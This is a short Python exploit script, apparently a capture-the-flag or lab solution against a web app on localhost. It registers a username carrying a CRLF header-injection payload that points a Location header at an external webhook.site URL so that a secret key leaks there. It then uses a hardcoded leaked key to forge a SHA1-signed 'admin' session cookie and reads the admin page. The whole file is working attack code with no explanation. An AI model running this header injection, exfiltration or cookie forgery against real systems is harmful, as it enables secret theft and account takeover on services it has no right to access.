import secrets
import hashlib

import requests

# Header injection payload.
PLD = 'someAuthUser' + secrets.token_hex(
    5) + '\r\nLocation: https://webhook.site/53101fd4-a969-4ed1-8899-ad8da9057c96\r\nA: '

# Register new user.
resp = requests.post('http://localhost:3210/register', data={
    'username': PLD,
    'password': 'xxxyyzz'
})
print(resp.status_code)

# Login new user
resp = requests.post('http://localhost:3210/login', data={
    'username': PLD,
    'password': 'xxxyyzz'
})

print(resp.status_code)
print(resp.headers)

# Read the leaked SecretKey variable from webhook.

secret_key = '0d31ff5b1ec6c8566f44211be650392da8b24b26'

digest = hashlib.sha1('{k}|{u}|{k}'.format(k=secret_key, u='admin').encode()).hexdigest()

print(digest)

resp = requests.get('http://localhost:3210/', cookies={
    'lsession': 'admin.' + digest
})

print(resp.text)
